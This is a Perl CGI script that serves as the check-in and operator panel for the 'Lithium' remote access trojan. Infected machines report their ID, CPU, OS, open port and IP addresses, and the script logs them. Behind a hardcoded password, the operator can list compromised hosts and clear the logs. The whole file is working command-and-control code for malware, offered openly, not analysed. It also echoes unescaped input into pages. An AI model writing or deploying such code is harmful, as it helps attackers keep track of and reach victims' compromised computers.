#!/usr/bin/perl
##########################################################
##########################################################
## Lithium R.A.T. CGI Notify Script v1.0                ##
## Coded by Olympus                                     ##
##########################################################
##########################################################

use CGI ':standard';

##########################################################

# Configuration variables                                #

##########################################################

$stylesheet = '../../lithium.css';
$compimg = '../../images/comp.gif';
$cgipassword = 'lemmein';
$key = '12345';

##########################################################

# Print out main header                                  #

##########################################################

sub printHeader($)
{
	print("Content-Type: text/html\n\n");
	print("<!doctype html public \"-//W3C//DTD HTML 4.01 Transitional//EN\">\n");
	print("<html>\n<head>\n<title>Lithium CGI Logger v1.0</title>\n");
	print("<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\n");
	print("<link rel=\"stylesheet\" type=\"text/css\" href=\"$stylesheet\">\n");
	print("</head>\n<body>\n<h1 align=\"left\">$_[0]</h1>\n");
	print("<p align=\"center\">\n");
	print("<a href=\"serverlist.pl?display=refresh\&password=$password\">Refresh</a> | \n"); 
	print("<a href=\"serverlist.pl?display=accesslog\&password=$password\">Access Log</a> | \n"); 
	print("<a href=\"serverlist.pl?display=admin\&password=$password\">Administration</a> | \n");
	print("<a href=\"serverlist.pl?display=about\&password=$password\">About</a>\n");
	print("</p>\n");
}

##########################################################

# Print out main footer                                  #

##########################################################

sub printFooter()
{
	print("</body>\n</html>\n");
}


##########################################################

# Entry point                                            #

##########################################################

$password = param('password');
$display = param('display');
$remoteip = $ENV{'REMOTE_ADDR'};

# Is this a server notifying us?

if ($display eq 'notify')
{
	# Get variables

	$access = param('access');
	$version = param('version');
	$serverid = param('serverid');
	$cpu = param('cpu');
	$os = param('os');
	$port = param('port');
	$iplist = param('iplist');

	$time = scalar(localtime);
	$remoteip = $ENV{'REMOTE_ADDR'};

	# Check access code

	if ($access ne $key)
	{
		exit;
	}

	# Check for valid arguments

	if (($version ne '') && ($serverid ne '') && ($cpu ne '') && ($os ne '') && ($port ne '') && ($iplist ne ''))
	{

		# Write entry to server log
	
		open(OUTFILE, ">>servers.log");
		printf OUTFILE "$time|$version|$serverid|$cpu|$os|$port|$remoteip|$iplist\n";
		close(OUTFILE);
	
	}

	# Display blank HTML code

	print "Content-Type: text/html\n\n";
	print "<html><body></body></html>\n";

	exit;
}

# Check if logged in

if ($password eq '')
{
	# Log access request
	
	$time = scalar(localtime);
	open(OUTFILE, ">>access.log");
	printf OUTFILE ("$time: $remoteip: Login page accessed.\n");
	close(OUTFILE);

	# Display login page

	print("Content-Type: text/html\n\n");
	print("<!doctype html public \"-//W3C//DTD HTML 4.01 Transitional//EN\">\n");
	print("<html>\n<head>\n<title>Lithium CGI Logger v1.0</title>\n");
	print("<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">\n");
	print("<link rel=\"stylesheet\" type=\"text/css\" href=\"$stylesheet\">\n");
	print("</head>\n<body>\n<h1>Login</h1>\n");
	print("<p align=\"center\"><b><u>Lithium CGI Logger</u></b></p>\n");
	print("<form method=\"POST\" action=\"serverlist.pl\">\n");
	print("<p align=\"center\">\n");

	print("Password<br><input type=\"password\" name=\"password\" size=\"20\"><br>\n");
	print("<input type=\"submit\" value=\"Submit\" name=\"S1\">\n");

	print("</p>\n</form>\n");
	print("Your IP ($remoteip) has been logged.\n");
	print("</body>\n</html>\n");
}
else
{	
	# Validate password

	if ($password eq $cgipassword)
	{
		# Display correct page

		if ($display eq 'accesslog')
		{
			# Log access log download
			
			$time = scalar(localtime);
			open(OUTFILE, ">>access.log");
			printf OUTFILE ("$time: $remoteip: Access log downloaded.\n");
			close(OUTFILE);

			# Print out header

			&printHeader('Access Log');

			# Display log

			open(INFILE, "access.log");
			my @lines = reverse(<INFILE>);
			close(INFILE);

			foreach $line (@lines)
			{
				chomp($line);
				print("$line<br>\n");
			}

			my $i = $#lines + 1;
			if (($i > 1) || ($i == 0))
			{
				print("<p>$i entries found in log.</p>\n");
			}
			else
			{
				print("<p>1 entry found in log.</p>\n");
			}	

			# Print out footer

			&printFooter();
		}
		elsif ($display eq 'about')
		{
			# Print out header

			&printHeader('About');

			# Display about HTML

			print("<p>\nLithium R.A.T. CGI Logger v1.0<br>\n");
			print("Coded for Lithium v1.02 by <a href=\"mailto:olympus\@lithiumrat.org\">Olympus</a><br>\n");
			print("<a href=\"http://www.lithiumrat.org\">http://www.lithiumrat.org</a><br><br>\n");
			print("This is the first version of the logger, and also my very first Perl program.<br>\n");
			print("As always, any feedback is appreciated.<br>\n</p>\n");

			# Print out footer

			&printFooter();
		}
		elsif ($display eq 'admin')
		{
			# Print out header

			&printHeader('Administration');

			# Print HTML

			print("<p align=\"center\"><a href=\"serverlist.pl?display=clearlist&password=$password\">Clear Server List (NO CONFIRMATION)</a><br><a href=\"serverlist.pl?display=clearlog&password=$password\">Clear Access Log (NO CONFIRMATION)</a></p>");

			# Print out footer

			&printFooter();
		}
		elsif ($display eq 'clearlist')
		{
			open(OUTFILE, ">servers.log");
			truncate(OUTFILE, 0);
			close(OUTFILE);
			&printHeader('Server List Cleared');
			&printFooter();
			
		}
		elsif ($display eq 'clearlog')
		{
			open(OUTFILE, ">access.log");
			truncate(OUTFILE, 0);
			close(OUTFILE);
			&printHeader('Access Log Cleared');
			&printFooter();	
		}
		else
		{
			# Log server list download

			$time = scalar(localtime);
			open(OUTFILE, ">>access.log");
			printf OUTFILE ("$time: $remoteip: Server list downloaded.\n");
			close(OUTFILE);

			# Print out page header

			&printHeader('Server List');

			# Print table header

			print("<table align=\"center\" border=\"1\" cellspacing=\"0\" cellpadding=\"2\">\n<tr>\n");
			print("<td class=\"tc\"></td>\n");
			print("<td class=\"tc\"><p align=\"center\"><b>Time</b></p></td>\n");
			print("<td class=\"tc\"><p align=\"center\"><b>Version</b></p></td>\n");
			print("<td class=\"tc\"><p align=\"center\"><b>Server ID</b></p></td>\n");
			print("<td class=\"tc\"><p align=\"center\"><b>CPU</b></p></td>\n");
			print("<td class=\"tc\"><p align=\"center\"><b>OS</b></p></td>\n");
			print("<td class=\"tc\"><p align=\"center\"><b>Port</b></p></td>\n");
			print("<td class=\"tc\"><p align=\"center\"><b>Notify IP</b></p></td>\n");
			print("<td class=\"tc\"><p align=\"center\"><b>Local IPs</b></p></td>\n</tr>\n");
		
			# Display server entries

			open(INFILE, "servers.log");
			my @lines = reverse(<INFILE>);
			close(INFILE);

			foreach $line (@lines)
			{
				chomp($line);
				my @vars = split(/\|/, $line);
				print("<tr>\n");
				print("<td class=\"tc\"><img src=\"$compimg\"></td>\n");
				foreach $var (@vars)
				{
					print("<td class=\"tc\"><p align=\"center\">$var</p></td>\n");	
				}
				print("</tr>\n");
			}
		

			print("</table>\n");

			my $i = $#lines + 1;
			if (($i > 1) || ($i == 0))
			{
				print("<p>$i entries found in database.</p>\n");
			}
			else
			{
				print("<p>1 entry found in database.</p>\n");
			}

			# Print out footer

			&printFooter();
		}
	}
	else
	{
		# Log failed login
	
		$time = scalar(localtime);
		open(OUTFILE, ">>access.log");
		printf OUTFILE ("$time: $remoteip: Failed login entry: Password = $password.\n");
		close(OUTFILE);
		
		# Show access denied page

		print("Content-Type: text/html\n\n");
		print("<!doctype html public \"-//W3C//DTD HTML 4.01 Transitional//EN\">\n");
		print("<html><head><title>Lithium CGI Logger v1.0</title>");
		print("<link rel=\"stylesheet\" type=\"text/css\" href=\"$stylesheet\">");
		print("<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\">");
		print("</head><body><h1 align=\"center\">Access denied</h1>");
		print("Invalid password.<br>\nYour IP ($remoteip) has been logged.\n");
		print("</body></html>");
	}
}


